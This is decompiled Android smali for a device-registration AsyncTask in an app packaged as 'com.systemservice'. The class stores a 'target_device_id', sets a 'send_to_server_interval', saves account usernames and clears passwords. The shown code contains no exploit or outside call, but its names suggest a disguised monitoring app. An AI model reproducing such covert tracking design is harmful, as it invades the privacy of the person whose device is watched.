.class Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;
.super Landroid/os/AsyncTask;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/systemservice/common/groupService/UICheckingDeviceActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "a"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/Boolean;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;


# direct methods
.method private constructor <init>(Lcom/systemservice/common/groupService/UICheckingDeviceActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/systemservice/common/groupService/UICheckingDeviceActivity;Lcom/systemservice/common/groupService/a;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;-><init>(Lcom/systemservice/common/groupService/UICheckingDeviceActivity;)V

    return-void
.end method


# virtual methods
.method protected varargs a([Ljava/lang/String;)Ljava/lang/Boolean;
    .locals 12

    const-string v0, ""

    const/4 v1, 0x1

    const/4 v2, 0x0

    :try_start_0
    iget-object v3, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-static {v3}, Lcom/systemservice/common/groupService/UICheckingDeviceActivity;->a(Lcom/systemservice/common/groupService/UICheckingDeviceActivity;)Landroid/content/SharedPreferences;

    move-result-object v3

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    const-string v4, "send_to_server_interval"

    const-wide/16 v5, 0x5

    invoke-interface {v3, v4, v5, v6}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    iget-object v4, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-static {v4}, Lcom/systemservice/common/groupService/UICheckingDeviceActivity;->a(Lcom/systemservice/common/groupService/UICheckingDeviceActivity;)Landroid/content/SharedPreferences;

    move-result-object v4

    sget-object v5, Lcom/systemservice/a/a/j;->a:Ljava/lang/String;

    invoke-interface {v4, v5, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v4

    if-eqz v4, :cond_0

    sget-object p1, Lcom/systemservice/a/a/j;->a:Ljava/lang/String;

    invoke-interface {v3, p1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    new-instance p1, Landroid/content/Intent;

    iget-object v1, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    const-class v3, Lcom/systemservice/UIMainActivity;

    invoke-direct {p1, v1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {p1, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-virtual {v1, p1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    iget-object p1, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    goto/16 :goto_4

    :cond_0
    array-length v4, p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const/4 v5, 0x0

    const/4 v6, 0x0

    :goto_0
    if-ge v5, v4, :cond_6

    :try_start_1
    aget-object v7, p1, v5

    const-string v8, "check_device_registered"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_5

    iget-object v7, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-virtual {v7}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v7}, Lcom/systemservice/a/a/l;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    const-string v8, "target_device_id"

    const-string v9, "DEVICE_ID"

    if-eqz v7, :cond_1

    :try_start_2
    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v10

    if-eqz v10, :cond_2

    :cond_1
    const-string v7, "device_id == null Check Device Activity"

    invoke-static {v9, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lcom/systemservice/a/a/l;->m()Ljava/lang/String;

    move-result-object v7

    invoke-interface {v3, v8, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_2
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, "  vvv"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget-object v9, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "DEVICE_ID = "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    if-eqz v7, :cond_5

    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_5

    invoke-interface {v3, v8, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    new-instance v7, Lcom/systemservice/common/features/settingHistory/b;

    iget-object v8, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-virtual {v8}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-direct {v7, v8, v1}, Lcom/systemservice/common/features/settingHistory/b;-><init>(Landroid/content/Context;Z)V

    iget-object v8, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-virtual {v8}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcom/systemservice/common/features/settingHistory/b;->a(Landroid/content/Context;)Lcom/systemservice/a/e/a;

    move-result-object v7
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    const-string v8, "is_registered_account"

    const-string v9, "username"

    if-eqz v7, :cond_3

    :try_start_3
    invoke-virtual {v7}, Lcom/systemservice/a/e/a;->b()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v3, v9, v6}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3, v8, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    const/4 v2, 0x1

    goto :goto_3

    :cond_3
    :try_start_4
    iget-object v7, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-static {v7}, Lcom/systemservice/common/groupService/UICheckingDeviceActivity;->b(Lcom/systemservice/common/groupService/UICheckingDeviceActivity;)Z

    move-result v7

    if-eqz v7, :cond_4

    :goto_1
    const/4 v6, 0x1

    goto :goto_2

    :cond_4
    invoke-interface {v3, v9, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v7, "password"

    invoke-interface {v3, v7, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3, v8, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v7, "has_get_settings"

    invoke-interface {v3, v7, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    const/4 v6, 0x0

    :cond_5
    :goto_2
    add-int/lit8 v5, v5, 0x1

    goto/16 :goto_0

    :catch_1
    move-exception p1

    move v2, v6

    goto :goto_3

    :cond_6
    move v2, v6

    goto :goto_4

    :catch_2
    move-exception p1

    :goto_3
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "TAG"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_4
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    return-object p1
.end method

.method protected a(Ljava/lang/Boolean;)V
    .locals 2

    if-eqz p1, :cond_1

    :try_start_0
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-static {p1}, Lcom/systemservice/common/groupService/UICheckingDeviceActivity;->c(Lcom/systemservice/common/groupService/UICheckingDeviceActivity;)V

    goto :goto_0

    :cond_0
    new-instance p1, Landroid/content/Intent;

    iget-object v0, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    const-class v1, Lcom/systemservice/UIMainActivity;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    iget-object v0, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-virtual {v0, p1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    iget-object p1, p0, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a:Lcom/systemservice/common/groupService/UICheckingDeviceActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :cond_1
    :goto_0
    return-void
.end method

.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a([Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object p1

    return-object p1
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    check-cast p1, Ljava/lang/Boolean;

    invoke-virtual {p0, p1}, Lcom/systemservice/common/groupService/UICheckingDeviceActivity$a;->a(Ljava/lang/Boolean;)V

    return-void
.end method
